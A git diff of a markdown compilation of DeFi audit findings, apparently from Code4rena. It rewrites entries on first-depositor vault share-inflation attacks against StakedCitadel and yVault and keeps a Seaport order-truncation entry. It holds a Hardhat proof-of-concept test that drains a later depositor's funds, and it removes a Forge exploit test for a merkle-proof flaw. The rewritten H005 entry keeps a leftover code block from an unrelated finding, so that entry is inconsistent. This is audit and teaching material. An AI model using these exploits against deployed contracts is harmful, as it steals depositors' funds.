@@ -151,13 +151,56 @@ function claimRepayedAmount() external {
 ```
 
 
-## H005 - Setting new controller can break YVaultLPFarming
+## H005 - StakedCitadel depositors can be attacked by the first depositor with depressing of vault token denomination
 
-### Description
+### Vulnerability details
+**Impact**
 
-The accruals in yVaultLPFarming will fail if currentBalance < previousBalance in _computeUpdate.
+An attacker can become the first depositor for a recently created StakedCitadel contract, providing a tiny amount of Citadel tokens by calling deposit(1) (raw values here, 1 is 1 wei, 1e18 is 1 Citadel as it has 18 decimals). Then the attacker can directly transfer, for example, 10^6*1e18 - 1 Citadel to StakedCitadel, effectively setting the cost of 1 of the vault token to be 10^6 * 1e18 Citadel. The attacker will still own 100% of the StakedCitadel's pool being the only depositor.
 
-### POC
+All subsequent depositors will have their Citadel token investments rounded to 10^6 * 1e18, due to the lack of precision which initial tiny deposit caused, with the remainder divided between all current depositors, i.e. the subsequent depositors lose value to the attacker.
+
+For example, if the second depositor brings in 1.9*10^6 * 1e18 Citadel, only 1 of new vault to be issued as 1.9*10^6 * 1e18 divided by 10^6 * 1e18 will yield just 1, which means that 2.9*10^6 * 1e18 total Citadel pool will be divided 50/50 between the second depositor and the attacker, as each have 1 wei of the total 2 wei of vault tokens, i.e. the depositor lost and the attacker gained 0.45*10^6 * 1e18 Citadel tokens.
+
+As there are no penalties to exit with StakedCitadel.withdraw(), the attacker can remain staked for an arbitrary time, gathering the share of all new deposits' remainder amounts.
+
+Placing severity to be high as this is principal funds loss scenario for many users (most of depositors), easily executable, albeit only for the new StakedCitadel contract.
+
+### Proof of Concept
+
+deposit() -> _depositFor() -> _mintSharesFor() call doesn't require minimum amount and mints according to the provided amount:
+
+deposit:
+
+https://github.com/code-423n4/2022-04-badger-citadel/blob/main/src/StakedCitadel.sol#L309-L311
+
+_depositFor:
+
+https://github.com/code-423n4/2022-04-badger-citadel/blob/main/src/StakedCitadel.sol#L764-L777
+
+_mintSharesFor:
+
+https://github.com/code-423n4/2022-04-badger-citadel/blob/main/src/StakedCitadel.sol#L881-L892
+
+When StakedCitadel is new the _pool = balance() is just initially empty contract balance:
+
+https://github.com/code-423n4/2022-04-badger-citadel/blob/main/src/StakedCitadel.sol#L293-L295
+
+Any deposit lower than total attacker's stake will be fully stolen from the depositor as 0 vault tokens will be issued in this case.
+
+### References
+
+The issue is similar to the TOB-YEARN-003 one of the Trail of Bits audit of Yearn Finance:
+
+https://github.com/yearn/yearn-security/tree/master/audits/20210719_ToB_yearn_vaultsv2
+
+### Recommended Mitigation Steps
+
+A minimum for deposit value can drastically reduce the economic viability of the attack. I.e. deposit() -> ... can require each amount to surpass the threshold, and then an attacker would have to provide too big direct investment to capture any meaningful share of the subsequent deposits.
+
+An alternative is to require only the first depositor to freeze big enough initial amount of liquidity. This approach has been used long enough by various projects, for example in Uniswap V2:
+
+https://github.com/Uniswap/v2-core/blob/master/contracts/UniswapV2Pair.sol#L119-L121
 
 🤦 Bad:
 ```solidity
@@ -185,12 +228,12 @@ function balanceOfJPEG() external view returns (uint256) {
 
 ### Background Information
 
-- [Chemical - w2](https://github.com/code-423n4/2022-04-jpegd-findings/issues/80)
+- [Chemical - w2](https://github.com/code-423n4/2022-04-badger-citadel-findings/issues/217)
 
 ## H006 - Truncation in OrderValidator can lead to resetting the fill and selling more tokens
 
 ### Vulnerability details
-#### Impact
+**Impact**
 
 A partial order's fractions (numerator and denominator) can be reset to 0 due to a truncation. This can be used to craft malicious orders:
     1. Consider user Alice, who has 100 ERC1155 tokens, who approved all of their tokens to the 'marketplaceContract'.
@@ -242,184 +285,57 @@ A basic fix for this would involve adding the above checks for overflow / trunca
 
 - [Chemical - w2](https://github.com/code-423n4/2022-05-opensea-seaport-findings/issues/77)
 
-## H007 - Setting new controller can break YVaultLPFarming
+## H007 - yVault: First depositor can break minting of shares
 
-### Description
-#### Impact
+### Vulnerability details
+**Impact**
 
-The protocol allows specifying several tokenIds to accept for a single offer.
-A merkle tree is created out of these tokenIds and the root is stored as the identifierOrCriteria for the item.
-The fulfiller then submits the actual tokenId and a proof that this tokenId is part of the merkle tree.
-
-There are no real verifications on the merkle proof that the supplied tokenId is indeed a leaf of the merkle tree.
-It's possible to submit an intermediate hash of the merkle tree as the tokenId and trade this NFT instead of one of the requested ones.
-
-This leads to losses for the offerer as they receive a tokenId that they did not specify in the criteria.
-Usually, this criteria functionality is used to specify tokenIds with certain traits that are highly valuable. The offerer receives a low-value token that does not have these traits.
-
-Example
-Alice wants to buy either NFT with tokenId 1 or tokenId 2.
-She creates a merkle tree of it and the root is hash(1||2) = 0xe90b7bceb6e7df5418fb78d8ee546e97c83a08bbccc01a0644d599ccd2a7c2e0.
-She creates an offer for this criteria.
-An attacker can now acquire the NFT with tokenId 0xe90b7bceb6e7df5418fb78d8ee546e97c83a08bbccc01a0644d599ccd2a7c2e0 (or, generally, any other intermediate hash value) and fulfill the trade.
-
->One might argue that this attack is not feasible because the provided hash is random and tokenIds are generally a counter. However, this is not required in the standard.
->
->"While some ERC-721 smart contracts may find it convenient to start with ID 0 and simply increment by one for each new NFT, callers SHALL NOT assume that ID numbers have any specific pattern to them, and MUST treat the ID as a 'black box'." EIP721
->
->Neither do the standard OpenZeppelin/Solmate implementations use a counter. They only provide internal _mint(address to, uint256 id) functions that allow specifying an arbitrary id. NFT contracts could let the user choose the token ID to mint, especially contracts that do not have any linked off-chain metadata like Uniswap LP positions.
-Therefore, ERC721-compliant token contracts are vulnerable to this attack.
+The attack vector and impact is the same as [TOB-YEARN-003](https://github.com/yearn/yearn-security/blob/master/audits/20210719_ToB_yearn_vaultsv2/ToB_-_Yearn_Vault_v_2_Smart_Contracts_Audit_Report.pdf), where users may not receive shares in exchange for their deposits if the total asset amount has been manipulated through a large “donation”.
 
 ### Proof of Concept
 
-Here's a forge test (gist) that shows the issue for the situation mentioned in Example.
+ - Attacker deposits 1 wei to mint 1 share
+ - Attacker transfers exorbitant amount to the StrategyPUSDConvex contract to greatly inflate the share’s price. Note that the strategy deposits its entire balance into Convex when its deposit() function is called.
+ - Subsequent depositors instead have to deposit an equivalent sum to avoid minting 0 shares. Otherwise, their deposits accrue to the attacker who holds the only share.
+
+Insert this test into yVault.ts.
 
 🚀 @audit:
 ```solidity
- contract BugMerkleTree is BaseOrderTest {
-    struct Context {
-        ConsiderationInterface consideration;
-        bytes32 tokenCriteria;
-        uint256 paymentAmount;
-        address zone;
-        bytes32 zoneHash;
-        uint256 salt;
-    }
+ it.only("will cause 0 share issuance", async () => {
+  // mint 10k + 1 wei tokens to user1
+  // mint 10k tokens to owner
+  let depositAmount = units(10_000);
+  await token.mint(user1.address, depositAmount.add(1));
+  await token.mint(owner.address, depositAmount);
+  // token approval to yVault
+  await token.connect(user1).approve(yVault.address, 1);
+  await token.connect(owner).approve(yVault.address, depositAmount);
+  
+  // 1. user1 mints 1 wei = 1 share
+  await yVault.connect(user1).deposit(1);
+  
+  // 2. do huge transfer of 10k to strategy
+  // to greatly inflate share price (1 share = 10k + 1 wei)
+  await token.connect(user1).transfer(strategy.address, depositAmount);
+  
+  // 3. owner deposits 10k
+  await yVault.connect(owner).deposit(depositAmount);
+  // receives 0 shares in return
+  expect(await yVault.balanceOf(owner.address)).to.equal(0);
 
-    function hashHashes(bytes32 hash1, bytes32 hash2)
-        internal
-        returns (bytes32)
-    {
-        // see MerkleProof.verify
-        bytes memory encoding;
-        if (hash1 <= hash2) {
-            encoding = abi.encodePacked(hash1, hash2);
-        } else {
-            encoding = abi.encodePacked(hash2, hash1);
-        }
-        return keccak256(encoding);
-    }
-
-    function testMerkleTreeBug() public resetTokenBalancesBetweenRuns {
-        // Alice wants to buy NFT ID 1 or 2 for token1. compute merkle tree
-        bytes32 leafLeft = bytes32(uint256(1));
-        bytes32 leafRight = bytes32(uint256(2));
-        bytes32 merkleRoot = hashHashes(leafLeft, leafRight);
-        console.logBytes32(merkleRoot);
-
-        Context memory context = Context(
-            consideration,
-            merkleRoot, /* tokenCriteria */
-            1e18, /* paymentAmount */
-            address(0), /* zone */
-            bytes32(0), /* zoneHash */
-            uint256(0) /* salt */
-        );
-        bytes32 conduitKey = bytes32(0);
-
-        token1.mint(address(alice), context.paymentAmount);
-        // @audit assume there's a token where anyone can acquire IDs. smaller IDs are more valuable
-        // we acquire the merkle root ID
-        test721_1.mint(address(this), uint256(merkleRoot));
-
-        _configureERC20OfferItem(
-            // start, end
-            context.paymentAmount, context.paymentAmount
-        );
-        _configureConsiderationItem(
-            ItemType.ERC721_WITH_CRITERIA,
-            address(test721_1),
-            // @audit set merkle root for NFTs we want to accept
-            uint256(context.tokenCriteria), /* identifierOrCriteria */
-            1,
-            1,
-            alice
-        );
-
-        OrderParameters memory orderParameters = OrderParameters(
-            address(alice),
-            context.zone,
-            offerItems,
-            considerationItems,
-            OrderType.FULL_OPEN,
-            block.timestamp,
-            block.timestamp + 1000,
-            context.zoneHash,
-            context.salt,
-            conduitKey,
-            considerationItems.length
-        );
-
-        OrderComponents memory orderComponents = getOrderComponents(
-            orderParameters,
-            context.consideration.getNonce(alice)
-        );
-        bytes32 orderHash = context.consideration.getOrderHash(orderComponents);
-        bytes memory signature = signOrder(
-            context.consideration,
-            alicePk,
-            orderHash
-        );
-
-        delete offerItems;
-        delete considerationItems;
-
-        /*************** ATTACK STARTS HERE ***************/
-        AdvancedOrder memory advancedOrder = AdvancedOrder(
-            orderParameters,
-            1, /* numerator */
-            1, /* denominator */
-            signature,
-            ""
-        );
-
-        // resolve the merkle root token ID itself
-        CriteriaResolver[] memory cr = new CriteriaResolver[](1);
-        bytes32[] memory proof = new bytes32[](0);
-        cr[0] = CriteriaResolver(
-              0, // uint256 orderIndex;
-              Side.CONSIDERATION, // Side side;
-              0, // uint256 index; (item)
-              uint256(merkleRoot), // uint256 identifier;
-              proof // bytes32[] criteriaProof;
-        );
-
-        uint256 profit = token1.balanceOf(address(this));
-        context.consideration.fulfillAdvancedOrder{
-            value: context.paymentAmount
-        }(advancedOrder, cr, bytes32(0));
-        profit = token1.balanceOf(address(this)) - profit;
-
-        // @audit could fulfill order without owning NFT 1 or 2
-        assertEq(profit, context.paymentAmount);
-    }
-}
+  // user1 withdraws both his and owner's deposits
+  // total amt: 20k + 1 wei
+  await expect(() => yVault.connect(user1).withdrawAll())
+    .to.changeTokenBalance(token, user1, depositAmount.mul(2).add(1));
+});
 ```
 
 ### Recommended Mitigation Steps
 
-Usually, this is fixed by using a type-byte that indicates if one is computing the hash for a leaf or not.
-An elegant fix here is to simply use hashes of the tokenIds as the leaves - instead of the tokenIds themselves. (Note that this is the natural way to compute merkle trees if the data size is not already the hash size.)
-Then compute the leaf hash in the contract from the provided tokenId:
-
-```solidity
-function _verifyProof(
-    uint256 leaf,
-    uint256 root,
-    bytes32[] memory proof
-) internal pure {
-    bool isValid;
-
--    assembly {
--        let computedHash := leaf
-+  bytes32 computedHash = keccak256(abi.encodePacked(leaf))
-  ...
-```
-
-here can't be a collision between a leaf hash and an intermediate hash anymore as the former is the result of hashing 32 bytes, while the latter are the results of hashing 64 bytes.
-
-Note that this requires off-chain changes to how the merkle tree is generated. (Leaves must be hashed first.)
+   1. Uniswap V2 solved this problem by sending the first 1000 LP tokens to the zero address. The same can be done in this case i.e. when totalSupply() == 0, send the first min liquidity LP tokens to the zero address to enable share dilution.
+   2. Ensure the number of shares to be minted is non-zero: require(_shares != 0, "zero shares minted");
 
 ### Background Information
 
-- [Chemical - w2](https://github.com/code-423n4/2022-05-opensea-seaport-findings/issues/168)
+- [Chemical - w2](https://github.com/code-423n4/2022-04-jpegd-findings/issues/12)
